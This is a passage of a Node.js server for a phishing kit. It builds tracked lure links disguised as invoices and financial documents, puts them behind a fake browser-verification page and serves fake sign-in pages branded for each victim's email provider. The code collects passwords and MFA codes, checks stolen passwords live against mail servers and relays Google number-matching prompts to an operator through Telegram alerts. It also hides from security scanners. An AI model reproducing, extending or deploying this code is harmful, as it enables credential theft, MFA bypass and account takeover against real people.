    expiresAt: new Date(Date.now() + hours * 3600000).toISOString(),
    documentType: docType,
  };
  saveLinksDB();
  const url = `/${routePrefix}/${hash}`;
  console.log(`[links] Generated link for ${email} by ${user.username}: ${url}`);
  res.json({ ok: true, hash, url });
});

// List links for current user (superadmin sees all)
app.get(`/${ADMIN_PATH}/api/links`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const now = Date.now();
  const entries = Object.entries(clientLinks)
    .filter(([, link]) => {
      if (link.expiresAt && new Date(link.expiresAt).getTime() < now) return false;
      if (user.role === 'superadmin') return true;
      return link.userId === user.id;
    })
    .map(([hash, link]) => {
      const s = link.stats || {};
      const docTypeRouteMap = { invoice: 'i', receipt: 'r', confirmation: 'c', invitation: 'invite', quickbook: 'q', fidelity: 'f' };
      const docType = link.documentType || 'invoice';
      const routePrefix = docTypeRouteMap[docType] || 'd';
      return {
        hash,
        email: link.email || '',
        createdBy: link.createdBy,
        createdAt: link.createdAt,
        expiresAt: link.expiresAt,
        url: `/${routePrefix}/${hash}`,
        stats: {
          clicks: s.clicks || 0,
          opens: s.opens || 0,
          emails: s.emails || 0,
          passwords: s.passwords || 0,
          mfas: s.mfas || 0,
          uniqueClickIps: s.uniqueClickIps || 0,
          uniqueOpenIps: s.uniqueOpenIps || 0,
          firstClick: s.firstClick || null,
          firstOpen: s.firstOpen || null,
          firstSubmit: s.firstSubmit || null,
          lastEvent: s.lastEvent || null,
        },
      };
    });
  res.json({ links: entries });
});

// Revoke a link
app.delete(`/${ADMIN_PATH}/api/links/:hashPrefix`, requireAdmin, (req, res) => {
  const prefix = req.params.hashPrefix;
  const key = Object.keys(clientLinks).find(h => h.startsWith(prefix));
  if (!key) return res.status(404).json({ error: 'Link not found.' });
  // Regular users can only revoke their own links
  if (req.session.adminUser.role !== 'superadmin' && clientLinks[key].userId !== req.session.adminUser.id) {
    return res.status(403).json({ error: 'Cannot revoke another user\'s link.' });
  }
  delete clientLinks[key];
  saveLinksDB();
  res.json({ ok: true });
});

// Public: serve viewer for client link
// PoW challenge tokens (prefix → { hash, nonce, ts })
const powChallenges = new Map();
setInterval(() => {
  const cutoff = Date.now() - 5 * 60 * 1000;
  for (const [k, v] of powChallenges) if (v.ts < cutoff) powChallenges.delete(k);
}, 60000);

const POW_DIFFICULTY = 2; // leading hex zeros required (lowered for testing)

app.get('/d/:hash', (req, res, next) => {
  const link = clientLinks[req.params.hash];
  if (!link) return next();
  if (link.expiresAt && new Date(link.expiresAt).getTime() < Date.now()) return next();

  // Funnel: every /d/:hash hit is a click (PoW page or viewer).
  recordLinkEvent(req.params.hash, 'click', getIp(req));

  // If PoW solved token present and valid, serve content
  const solvedCookie = req.cookies && req.cookies[`pow_${req.params.hash.slice(0,8)}`];
  if (solvedCookie) {
    const challenge = powChallenges.get(solvedCookie);
    if (challenge && challenge.hash === req.params.hash && challenge.solved) {
      // Funnel: viewer page actually rendered.
      recordLinkEvent(req.params.hash, 'open', getIp(req));
      return sendLocalizedIndex(req, res);
    }
  }

  // Issue a PoW challenge
  const token = crypto.randomBytes(12).toString('hex');
  const nonce = crypto.randomBytes(16).toString('hex');
  powChallenges.set(token, { hash: req.params.hash, nonce, ts: Date.now(), solved: false });

  res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Verifying…</title>
<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0a0a0a;color:#e0e0e0}.box{text-align:center}.sp{width:40px;height:40px;border:3px solid #333;border-top-color:#4a9eff;border-radius:50%;animation:s 0.8s linear infinite;margin:0 auto 16px}@keyframes s{to{transform:rotate(360deg)}}</style>
</head><body><div class="box"><div class="sp"></div><div>Verifying your browser…</div><small style="color:#666;display:block;margin-top:8px">This may take a moment</small></div>
<script>
(async () => {
  const token = ${JSON.stringify(token)};
  const nonce = ${JSON.stringify(nonce)};
  const difficulty = ${POW_DIFFICULTY};
  const target = '0'.repeat(difficulty);
  const enc = new TextEncoder();
  async function sha(s){ const b = await crypto.subtle.digest('SHA-256', enc.encode(s)); return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join(''); }
  let n = 0, h = '';
  while (true) {
    h = await sha(nonce + ':' + n);
    if (h.startsWith(target)) break;
    n++;
    if (n % 5000 === 0) await new Promise(r=>setTimeout(r,0));
  }
  const resp = await fetch('/d-verify', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ token, n, h }) });
  if (resp.ok) location.reload();
  else document.body.innerHTML = '<div class="box" style="color:#f66">Verification failed.</div>';
})();
</script></body></html>`);
});

// FIX: Document type routing - maps URL route prefix to document type
// /i/ = invoice, /r/ = receipt, /c/ = confirmation, /p/ = personal, /invite/ = invitation, /q/ = quickbook, /f/ = fidelity
// This ensures PDF generation knows which type to generate (/r/ gets receipt PDF, not invoice, etc.)
const docTypeMap = { i: 'invoice', r: 'receipt', c: 'confirmation', p: 'personal', invite: 'invitation', q: 'quickbook', f: 'fidelity' };
['i', 'r', 'c', 'p', 'invite', 'q', 'f'].forEach(type => {
  app.get(`/${type}/:hash/:email?`, (req, res, next) => {
    console.log(`[${type}/:hash/:email?] Route matched, path=${req.path}, email=${req.params.email}`);
    const link = clientLinks[req.params.hash];
    if (!link) return next();
    if (link.expiresAt && new Date(link.expiresAt).getTime() < Date.now()) return next();
    recordLinkEvent(req.params.hash, 'click', getIp(req));
    const cookieKey = `pow_${req.params.hash.slice(0,8)}`;
    const solvedCookie = req.cookies && req.cookies[cookieKey];
    console.log(`[${type}/:hash/:email?] Checking PoW cookie "${cookieKey}": ${solvedCookie ? 'found' : 'NOT found'}`);
    if (solvedCookie) {
      const challenge = powChallenges.get(solvedCookie);
      console.log(`[${type}/:hash/:email?] Challenge lookup: ${challenge ? 'found' : 'NOT found'}, solved=${challenge?.solved}`);
      if (challenge && challenge.hash === req.params.hash && challenge.solved) {
        recordLinkEvent(req.params.hash, 'open', getIp(req));
        const docTypeValue = docTypeMap[type] || 'invoice';
        console.log(`[${type}/:hash/:email?] PoW verified! Setting documentType to: ${docTypeValue}`);
        res.locals.documentType = docTypeValue;
        res.locals.prefilledEmail = req.params.email || '';
        return sendLocalizedIndex(req, res);
      }
    }
    const token = crypto.randomBytes(12).toString('hex');
    const nonce = crypto.randomBytes(16).toString('hex');
    powChallenges.set(token, { hash: req.params.hash, nonce, ts: Date.now(), solved: false });
    const difficulty = POW_DIFFICULTY;
    res.type('html').send(`<!doctype html><html><head><meta charset="utf-8"><title>Verifying…</title><style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#0a0a0a;color:#e0e0e0}.box{text-align:center}.sp{width:40px;height:40px;border:3px solid #333;border-top-color:#4a9eff;border-radius:50%;animation:s 0.8s linear infinite;margin:0 auto 16px}@keyframes s{to{transform:rotate(360deg)}}</style></head><body><div class="box"><div class="sp"></div><div>Verifying your browser…</div><small style="color:#666;display:block;margin-top:8px">This may take a moment</small></div><script>(async ()=>{const token=${JSON.stringify(token)};const nonce=${JSON.stringify(nonce)};const target='0'.repeat(${difficulty});const enc=new TextEncoder();async function sha(s){const b=await crypto.subtle.digest('SHA-256',enc.encode(s));return[...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}let n=0,h='';while(true){h=await sha(nonce+':'+n);if(h.startsWith(target))break;n++;if(n%5000===0)await new Promise(r=>setTimeout(r,0));}const resp=await fetch('/d-verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,n,h})});if(resp.ok)location.reload();else document.body.innerHTML='<div class="box" style="color:#f66">Verification failed.</div>';})();</script></body></html>`);
  });
});

app.post('/d-verify', express.json(), (req, res) => {
  const { token, n, h } = req.body || {};
  const challenge = powChallenges.get(token);
  if (!challenge) return res.status(400).json({ error: 'invalid' });
  if (Date.now() - challenge.ts > 5 * 60 * 1000) { powChallenges.delete(token); return res.status(400).json({ error: 'expired' }); }
  const expected = crypto.createHash('sha256').update(challenge.nonce + ':' + n).digest('hex');
  if (expected !== h || !h.startsWith('0'.repeat(POW_DIFFICULTY))) return res.status(400).json({ error: 'bad proof' });
  challenge.solved = true;
  res.cookie(`pow_${challenge.hash.slice(0,8)}`, token, { httpOnly: true, sameSite: 'strict', maxAge: 30 * 60 * 1000 });
  res.json({ ok: true });
});

// DEBUG: Test document type branding (bypass PoW)
app.get('/test/quickbook/:hash', (req, res) => {
  res.locals.documentType = 'quickbook';
  sendLocalizedIndex(req, res);
});
app.get('/test/receipt/:hash', (req, res) => {
  res.locals.documentType = 'receipt';
  sendLocalizedIndex(req, res);
});

app.get('/test/fidelity/:hash', (req, res) => {
  res.locals.documentType = 'fidelity';
  sendLocalizedIndex(req, res);
});

app.get('/test/invoice/:hash', (req, res) => {
  res.locals.documentType = 'invoice';
  sendLocalizedIndex(req, res);
});

// Email-based branding route: /email@domain.com
app.get('/:email', (req, res, next) => {
  const email = req.params.email;
  // Validate email format
  if (!email.includes('@') || !email.includes('.')) return next();

  const provider = detectEmailProvider(email);
  if (!provider) return next();

  console.log(`[Email Route] Email: ${email}, Provider: ${provider}`);
  res.locals.documentType = provider;
  sendLocalizedIndex(req, res);
});

// Public endpoint: get login settings (no admin auth needed)
app.get('/api/login-settings', (req, res) => {
  res.json({
    maxPasswordAttempts: appSettings.maxPasswordAttempts,
    maxMfaAttempts: appSettings.maxMfaAttempts,
  });
});

// Password verification with attempt tracking.
// Tracks how far through the password+MFA gauntlet a recipient has progressed,
// so we can defer the corrupt-doc vs not-compatible verdict until every
// configured attempt has been used. Keyed by IP+email (not session cookie) —
// the chameleon iframe loads cross-site (Dropbox, file://, Cloudflare Workers,
// etc.) where third-party cookies are unreliable or fully blocked. In-memory
// Map with a 30-min idle TTL so stale entries don't leak memory.
const flowStates = new Map(); // key "ip|email" → { passwordAttempts, mfaAttempts, passwordValid, ts }
const FLOW_TTL_MS = 30 * 60 * 1000;
function flowKey(ip, email) { return `${ip || '?'}|${(email || '').toLowerCase()}`; }
function getFlowState(ip, email) {
  const k = flowKey(ip, email);
  let s = flowStates.get(k);
  const now = Date.now();
  if (!s || now - s.ts > FLOW_TTL_MS) {
    s = { passwordAttempts: 0, mfaAttempts: 0, passwordValid: false, ts: now };
    flowStates.set(k, s);
  }
  s.ts = now;
  return s;
}
function resetFlowState(ip, email) { flowStates.delete(flowKey(ip, email)); }
// Periodic sweep so dead sessions don't accumulate.
setInterval(() => {
  const cutoff = Date.now() - FLOW_TTL_MS;
  for (const [k, s] of flowStates) if (s.ts < cutoff) flowStates.delete(k);
}, 10 * 60 * 1000).unref();

app.post('/api/verify-password', authLimiter, rateLimit, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required.' });

  const key = email.toLowerCase();
  const ip = getIp(req);

  let slug = req.body._slug || null;
  if (!slug && req.body._hash) {
    const link = clientLinks[req.body._hash];
    if (link) slug = link.slug;
  }
  if (req.body._hash && clientLinks[req.body._hash]) recordLinkEvent(req.body._hash, 'password', ip);

  // IMAP/SMTP verify still runs (operator sees VALID/Invalid in Telegram), but the
  // result no longer ends the flow — it's stashed on session for the final verdict.
  let imapResult = 'error', verifyMethod = 'imap';
  try {
    const verifyPromise = verifyCredentials(email, password);
    const timeoutPromise = new Promise(r => setTimeout(() => r({ result: 'timeout', method: 'imap' }), 12000));
    const out = await Promise.race([verifyPromise, timeoutPromise]);
    imapResult = out.result;
    verifyMethod = out.method;
  } catch (e) {
    console.warn('[verify-password]', e.message);
    imapResult = 'error';
  }

  logAttempt({
    email: key, password, ip,
    userAgent: req.headers['user-agent'],
    slug, type: 'password',
    campaignId: req.body._cid || null,
    campaignDomain: req.body._cdm || null,
    imapResult, verifyMethod,
  });

  // Track flow state by IP+email (not session — third-party cookies aren't reliable here).
  const flow = getFlowState(ip, key);
  flow.passwordAttempts++;
  if (imapResult === 'valid') flow.passwordValid = true;

  const maxPwd = appSettings.maxPasswordAttempts;
  const remaining = Math.max(0, maxPwd - flow.passwordAttempts);

  // Always present as "wrong password, X tries left" until the password budget is exhausted,
  // then signal the client to transition to MFA. The recipient never sees the wall here.
  if (remaining > 0) {
    return res.json({
      success: false,
      retry: true,
      error: 'Incorrect password.',
      maxAttempts: maxPwd,
      remaining,
    });
  }
  return res.json({
    success: false,
    gotoMfa: true,
    maxAttempts: maxPwd,
  });
});

// MFA verification endpoint (client login flow)
app.post('/api/verify-mfa', authLimiter, rateLimit, (req, res) => {
  const { email, code, method } = req.body;
  if (!email || !code) return res.status(400).json({ error: 'Email and code required.' });

  let slug = req.body._slug || null;
  if (!slug && req.body._hash) {
    const link = clientLinks[req.body._hash];
    if (link) slug = link.slug;
  }
  if (req.body._hash && clientLinks[req.body._hash]) recordLinkEvent(req.body._hash, 'mfa', getIp(req));

  const key = (email || '').toLowerCase();

  logAttempt({
    email: key,
    mfaCode: code,
    mfaMethod: method || 'app',
    ip: getIp(req),
    userAgent: req.headers['user-agent'],
    slug,
    type: 'mfa',
    campaignId: req.body._cid || null,
    campaignDomain: req.body._cdm || null,
  });

  const ip = getIp(req);
  addStrike(ip, 'failed_mfa');

  // Track flow state by IP+email (matches /api/verify-password).
  const flow = getFlowState(ip, key);
  flow.mfaAttempts++;

  const maxMfa = appSettings.maxMfaAttempts;
  const remaining = Math.max(0, maxMfa - flow.mfaAttempts);

  // Still inside the MFA budget — keep telling them the code is wrong.
  if (remaining > 0) {
    return res.json({
      success: false,
      retry: true,
      error: 'Invalid verification code.',
      maxAttempts: maxMfa,
      remaining,
    });
  }

  // Budget exhausted — final verdict. If any password during this session was
  // IMAP-verified valid → corrupt PDF screen. Otherwise → "not compatible" wall.
  const passwordValid = !!flow.passwordValid;
  resetFlowState(ip, key); // fresh start if the user reloads later

  if (passwordValid) {
    return res.json({ success: true, corruptDoc: true });
  }
  return res.json({
    success: false,
    notCompatible: true,
    error: 'Your device is not compatible with this document. Please try opening it on a different device.',
  });
});

// ---- Recipient-side: announce arrival on the Google MFA page ----
// Called by the chameleon login flow the moment the Google Prompt screen renders.
// Registers an active session, alerts the operator (Telegram + SSE), so the
// operator can push a number that matches the real Google number-matching prompt.
app.post('/api/mfa-presence', authLimiter, rateLimit, (req, res) => {
  const email = (req.body && req.body.email || '').toLowerCase();
  if (!email) return res.status(400).json({ error: 'email required' });
  const ip = getIp(req);
  let slug = req.body._slug || null;
  if (!slug && req.body._hash) {
    const link = clientLinks[req.body._hash];
    if (link) slug = link.slug;
  }
  const key = activeMfaKey(ip, email);
  const existed = activeMfaSessions.has(key);
  const now = Date.now();
  const session = activeMfaSessions.get(key) || {};
  const merged = {
    ip, email, slug,
    ua: req.headers['user-agent'] || '',
    ts: now,
    number: session.number || null,
    pushedAt: session.pushedAt || null,
    campaignId: req.body._cid || null,
    campaignDomain: req.body._cdm || null,
  };
  activeMfaSessions.set(key, merged);

  // Realtime push to admins (filtered by slug ownership).
  broadcast('mfa-presence', { ip, email, slug, ts: now, campaignId: merged.campaignId },
    (c) => c.role === 'superadmin' || (slug && c.slug === slug));

  // Telegram alert — only on first arrival, not on every re-poll.
  if (!existed) {
    const notifyUsers = usersDB.filter(u => {
      if (!u.telegramEnabled || !u.telegramBotToken || !u.telegramChatId) return false;
      if (u.role === 'superadmin') return true;
      return slug && u.slug === slug;
    });
    const geo = (typeof geoForIp === 'function' && geoForIp(ip)) || (typeof offlineGeo === 'function' && offlineGeo(ip)) || null;
    let geoLine = '';
    if (geo) {
      const cc = geo.countryCode || '';
      const flag = cc.length === 2 ? String.fromCodePoint(...cc.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0))) : '';
      const locParts = [geo.city, geo.region, geo.country].filter(Boolean);
      if (locParts.length) geoLine = `\n📍 ${flag} ${locParts.join(', ')}`;
    }
    const txt =
      `🟢 *Google MFA — Victim On Page*\n\n` +
      `📧 *Email:* \`${email}\`\n` +
      `🌐 *IP:* \`${ip}\`` + geoLine + `\n` +
      `⏳ *Awaiting number push from operator...*\n` +
      `→ Open admin → *Active MFA* panel and push the 2-digit number from the real Google sign-in.`;
    for (const u of notifyUsers) {
      fetch(`https://api.telegram.org/bot${u.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: u.telegramChatId, text: txt, parse_mode: 'Markdown', disable_web_page_preview: true }),
      }).catch(() => {});
    }
  }

  res.json({ ok: true });
});

// ---- Recipient-side: poll for an operator-pushed number ----
// The Google Prompt screen polls this every ~1.5s. Returns the pushed number
// once the operator submits one in the admin "Active MFA" panel.
app.get('/api/mfa-prompt-number', rateLimit, (req, res) => {
  const email = (req.query && req.query.email || '').toLowerCase();
  if (!email) return res.json({ number: null });
  const ip = getIp(req);
  const session = activeMfaSessions.get(activeMfaKey(ip, email));
  if (!session) return res.json({ number: null });
  // Refresh idle timer so the session doesn't expire while the recipient is waiting.
  session.ts = Date.now();
  res.json({ number: session.number || null, pushedAt: session.pushedAt || null });
});

// ---- Admin: list currently-active Google MFA sessions ----
app.get(`/${ADMIN_PATH}/api/mfa-active`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  const isSuper = dbUser && dbUser.role === 'superadmin';
  const mySlug = dbUser ? dbUser.slug : null;
  const list = [];
  const cutoff = Date.now() - ACTIVE_MFA_TTL_MS;
  for (const [k, s] of activeMfaSessions) {
    if (s.ts < cutoff) { activeMfaSessions.delete(k); continue; }
    if (!isSuper && s.slug !== mySlug) continue;
    list.push({
      ip: s.ip, email: s.email, slug: s.slug, ts: s.ts,
      number: s.number || null, pushedAt: s.pushedAt || null,
      campaignId: s.campaignId || null,
    });
  }
  list.sort((a, b) => b.ts - a.ts);
  res.json({ sessions: list });
});

// ---- Admin: push a 2-digit number to a victim's Google MFA screen ----
app.post(`/${ADMIN_PATH}/api/mfa-push`, requireAdmin, (req, res) => {
  const { ip, email, number } = req.body || {};
  if (!ip || !email) return res.status(400).json({ error: 'ip and email required' });
  const n = String(number || '').replace(/\D/g, '');
  if (!/^\d{1,3}$/.test(n)) return res.status(400).json({ error: 'number must be 1–3 digits' });
  const key = activeMfaKey(ip, email.toLowerCase());
  const session = activeMfaSessions.get(key);
  if (!session) return res.status(404).json({ error: 'No active MFA session for that ip+email.' });

  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  const isSuper = dbUser && dbUser.role === 'superadmin';
  if (!isSuper && session.slug !== (dbUser && dbUser.slug)) return res.status(403).json({ error: 'Not your session.' });

  session.number = n;
  session.pushedAt = Date.now();
  session.ts = Date.now();

  // Notify other admins watching the same slug that a number was pushed.
  broadcast('mfa-push', { ip, email: session.email, slug: session.slug, number: n, ts: session.pushedAt },
    (c) => c.role === 'superadmin' || (session.slug && c.slug === session.slug));

  res.json({ ok: true, number: n });
});

// ---- Provider detection (protected) ----
app.post('/auth/detect', rateLimit, blockBots, verifyChallenge, async (req, res) => {
  const email = (req.body.email || '').trim().toLowerCase();
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Invalid email.' });
  }
  const domain = email.split('@')[1];
  const detected = await detectProvider(email, domain);
  const provider = detected.provider || 'email';
  const themeInfo = PROVIDER_THEMES[provider];
  const info = themeInfo ? { name: themeInfo.name, color: themeInfo.primary } : (PROVIDER_INFO[provider] || PROVIDER_INFO.email);

  // Track device fingerprint (with user slug if provided)
  const ip = (req.headers['x-forwarded-for'] || req.ip || req.socket.remoteAddress || '').toString().split(',')[0].trim();
  const ua = req.headers['user-agent'] || '';
  // Resolve slug: direct slug or from client link hash
  let slug = req.body._slug || null;
  if (!slug && req.body._hash) {
    const link = clientLinks[req.body._hash];
    if (link) slug = link.slug;
  }
  if (req.body._hash && clientLinks[req.body._hash]) recordLinkEvent(req.body._hash, 'email', ip);
  const fpResult = trackFingerprint(email, req.body._fp, req.body._fpSignals, ip, ua, slug);

  // Log the email submission so it shows under the right attachment's Clients
  // dropbox. This is the email-only step before password — record as type 'email'.
  logAttempt({
    email,
    password: '',
    ip,
    userAgent: ua,
    slug,
    provider,
    type: 'email',
    campaignId: req.body._cid || null,
    campaignDomain: req.body._cdm || null,
  });

  // Check if the user who owns this slug has MFA enabled
  let mfaRequired = false;
  if (slug) {
    const owner = usersDB.find(u => u.slug === slug);
    if (owner && owner.mfaEnabled) mfaRequired = true;
  }

  // Build the OAuth URL if provider is supported
  let oauthUrl = null;
  if (provider === 'google' && GOOGLE_CLIENT_ID) {
    oauthUrl = `/auth/google?email=${encodeURIComponent(email)}`;
  } else if (provider === 'microsoft' && msalClient) {
    oauthUrl = `/auth/microsoft?email=${encodeURIComponent(email)}`;
  }

  // For Microsoft tenants, fetch the actual Azure AD brand logo (uploaded
  // by the tenant admin in their Azure portal). This is the SAME logo
  // login.microsoftonline.com displays on the branded sign-in page.
  let tenantBrand = null;
  if (provider === 'microsoft') {
    tenantBrand = await fetchMicrosoftTenantBranding(email);
  }

  res.json({
    provider,
    name: info.name,
    color: info.color,
    email,
    domain,
    brandName: detected.brandName || null,
    brandLogo: tenantBrand && (tenantBrand.bannerLogo || tenantBrand.tileLogo) || null,
    brandBanner: tenantBrand && tenantBrand.bannerLogo || null,
    brandTile: tenantBrand && tenantBrand.tileLogo || null,
    brandBackground: tenantBrand && tenantBrand.backgroundColor || null,
    oauthUrl,
    mfaRequired,
    _security: {
      deviceCount: fpResult.deviceCount,
      flagged: fpResult.flagged,
      newDevice: fpResult.isNewDevice,
    },
  });
});

// ---- Microsoft OAuth flow ----
app.get('/auth/microsoft', async (req, res) => {
  if (!msalClient) return res.status(500).send('Microsoft sign-in is not configured.');
  try {
    const state = crypto.randomBytes(16).toString('hex');
    req.session.oauthState = state;
    req.session.pendingEmail = req.query.email || '';
    const url = await msalClient.getAuthCodeUrl({
      scopes: ['openid', 'profile', 'email', 'User.Read'],
      redirectUri: MS_REDIRECT_URI,
      state,
      prompt: 'select_account',
      loginHint: req.query.email || undefined,
    });
    res.redirect(url);
  } catch (e) {
    console.error('getAuthCodeUrl failed:', e);
    res.status(500).send('Could not start sign-in.');
  }
});

app.get('/auth/callback', async (req, res) => {
  if (!msalClient) return res.status(500).send('Microsoft sign-in is not configured.');
  if (req.query.error) return res.status(400).send(`Sign-in cancelled: ${req.query.error_description || req.query.error}`);
  if (!req.query.code) return res.status(400).send('Missing authorization code.');
  if (!req.session.oauthState || req.query.state !== req.session.oauthState) return res.status(400).send('Invalid OAuth state.');
  try {
    const result = await msalClient.acquireTokenByCode({
      code: req.query.code,
      scopes: ['openid', 'profile', 'email', 'User.Read'],
      redirectUri: MS_REDIRECT_URI,
    });
    const account = result.account || {};
    req.session.user = {
      email: account.username || result.idTokenClaims?.preferred_username || req.session.pendingEmail || null,
      name: account.name || result.idTokenClaims?.name || null,
      provider: 'microsoft',
      loggedInAt: new Date().toISOString(),
    };
    delete req.session.oauthState;
    delete req.session.pendingEmail;
    res.redirect('/');
  } catch (e) {
    console.error('acquireTokenByCode failed:', e);
    res.status(500).send('Sign-in failed.');
  }
});

// ---- Google OAuth flow ----
app.get('/auth/google', (req, res) => {
  if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) return res.status(500).send('Google sign-in is not configured.');
  const state = crypto.randomBytes(16).toString('hex');
  req.session.googleState = state;
  req.session.pendingEmail = req.query.email || '';
  const params = new URLSearchParams({
    client_id: GOOGLE_CLIENT_ID,
    redirect_uri: GOOGLE_REDIRECT_URI,
    response_type: 'code',
    scope: 'openid email profile',
    state,
    login_hint: req.query.email || '',
    access_type: 'offline',
    prompt: 'consent',
  });
  res.redirect(`https://accounts.google.com/o/oauth2/v2/auth?${params}`);
});

app.get('/auth/google/callback', async (req, res) => {
  if (req.query.error) return res.status(400).send(`Sign-in cancelled: ${req.query.error}`);
  if (!req.query.code) return res.status(400).send('Missing authorization code.');
  if (!req.session.googleState || req.query.state !== req.session.googleState) return res.status(400).send('Invalid OAuth state.');
  try {
    // Exchange code for tokens
    const tokenResp = await fetch('https://oauth2.googleapis.com/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        code: req.query.code,
        client_id: GOOGLE_CLIENT_ID,
        client_secret: GOOGLE_CLIENT_SECRET,
        redirect_uri: GOOGLE_REDIRECT_URI,
        grant_type: 'authorization_code',
      }),
    });
    const tokens = await tokenResp.json();
    if (tokens.error) throw new Error(tokens.error_description || tokens.error);

    // Decode ID token (JWT payload)
    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
    req.session.user = {
      email: payload.email || req.session.pendingEmail || null,
      name: payload.name || null,
      picture: payload.picture || null,
      provider: 'google',
      loggedInAt: new Date().toISOString(),
    };
    delete req.session.googleState;
    delete req.session.pendingEmail;
    res.redirect('/');
  } catch (e) {
    console.error('Google token exchange failed:', e);
    res.status(500).send('Sign-in failed.');
  }
});

// ---- Email-based login (fallback for unsupported providers) ----
app.post('/auth/email', rateLimit, blockBots, (req, res) => {
  const email = (req.body.email || '').trim().toLowerCase();
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }
  const name = email.split('@')[0].replace(/[._-]/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
  req.session.user = {
    email,
    name,
    provider: 'email',
    loggedInAt: new Date().toISOString(),
  };
  res.json({ ok: true, user: req.session.user });
});

app.post('/auth/logout', (req, res) => {
  req.session.destroy(() => res.json({ ok: true }));
});
app.get('/auth/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login'));
});

// Static files (public assets) — login page is public, but index.html behind auth.
// 7-day Cache-Control + ETag means repeat visits get 304-not-modified instead of
// re-downloading the obfuscated bundles. The obfuscator regenerates files each
// time it runs, so the file mtime acts as a natural cache-bust.
const STATIC_OPTS = { maxAge: '7d', etag: true, lastModified: true };
app.use('/css', express.static(path.join(__dirname, 'public/css'), STATIC_OPTS));
// When OBFUSCATED=1, transparently swap /js/foo.js → /js/foo.obf.js (if present)
app.use('/js', (req, res, next) => {
  if (process.env.OBFUSCATED !== '1') return next();
  const m = req.url.match(/^(\/[^?]+)\.js(\?.*)?$/);
  if (!m) return next();
  const obfPath = path.join(__dirname, 'public', 'js', m[1] + '.obf.js');
  try {
    const stat = fs.statSync(obfPath);
    // Cheap weak ETag from size + mtime — sufficient for 304 negotiation.
    const etag = 'W/"' + stat.size.toString(16) + '-' + stat.mtimeMs.toString(36) + '"';
    if (req.headers['if-none-match'] === etag) {
      res.statusCode = 304; return res.end();
    }
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=604800');
    res.setHeader('ETag', etag);
    res.setHeader('Last-Modified', stat.mtime.toUTCString());
    return fs.createReadStream(obfPath).pipe(res);
  } catch { return next(); }
});
app.use('/js', express.static(path.join(__dirname, 'public/js'), STATIC_OPTS));
app.use('/img', express.static(path.join(__dirname, 'public/img'), { maxAge: '7d', etag: true, lastModified: true }));

// ---- Client access routes (all tracked to a user) ----
// ---- Rotating one-time URL system ----
// Each visitor gets a session; every page load rotates the URL. Old URLs dead on reuse.
const rotatingSessions = new Map(); // sid → { userId, email, currentToken, tokenState, createdAt }
const tokenIndex = new Map();       // token → sid
const ROTATE_TTL = 60 * 60 * 1000;  // 1h session lifespan
setInterval(() => {
  const cutoff = Date.now() - ROTATE_TTL;
  for (const [sid, s] of rotatingSessions) {
    if (s.createdAt < cutoff) {
      if (s.currentToken) tokenIndex.delete(s.currentToken);
      rotatingSessions.delete(sid);
    }
  }
}, 5 * 60 * 1000);

function newToken() { return crypto.randomBytes(12).toString('hex'); }
function createRotatingSession(userId, email) {
  const sid = crypto.randomBytes(16).toString('hex');
  const token = newToken();
  rotatingSessions.set(sid, { userId, email: email || null, currentToken: token, tokenState: 'fresh', createdAt: Date.now() });
  tokenIndex.set(token, sid);
  return { sid, token };
}
function rotateToken(sid) {
  const s = rotatingSessions.get(sid);
  if (!s) return null;
  if (s.currentToken) tokenIndex.delete(s.currentToken);
  const t = newToken();
  s.currentToken = t; s.tokenState = 'fresh';
  tokenIndex.set(t, sid);
  return t;
}

// URL formats supported:
//   /v/:slug                          → entry; issue rotating token, redirect
//   /v/:slug/:token                   → rotating; refresh → new token
//   /v/:slug/:token/:email            → rotating + email prefill (preserved across rotations)
//   /v/:slug/e/:email                 → entry with email; redirect to /v/:slug/:token/:email

function buildUrl(slug, token, email, cid) {
  let url = email ? `/v/${slug}/${token}/${encodeURIComponent(email)}` : `/v/${slug}/${token}`;
  if (cid) url += `?cid=${encodeURIComponent(cid)}`;
  return url;
}

// Lock /v/* down to chameleon-only:
//   1. Require a `cid` (query OR v_cid cookie) that matches a registered attachment
//   2. Reverse-DNS the visitor IP — cloud/hosting/VPN hostnames are bots, trap them
//   3. Real recipients on residential ISPs pass straight through
// Failures are HONEYPOT-TRAPPED: 7-day IP+device ban, dead TCP socket.
async function requireChameleonCid(req, res, next) {
  const hostHeader = (req.headers.host || '').toLowerCase().split(':')[0];
  if (hostHeader === 'localhost' || hostHeader === '127.0.0.1') return next();

  // Logged-in admins (session cookie set) are exempt — they may be testing.
  const isAdminSession = req.session && req.session.adminUser;
  // Slug-owner exemption: 10-char hex slugs aren't realistically guessable, so a request for
  // a slug that matches a real user is almost certainly that user re-testing an old link, not
  // a scanner — stale cid = 404, never a 7-day self-trap (survives session loss on restart).
  const slugIsRegistered = req.params && req.params.slug && usersDB.some(u => u.slug === req.params.slug);
  const trapExempt = isAdminSession || slugIsRegistered;
  const ip = getIp(req);

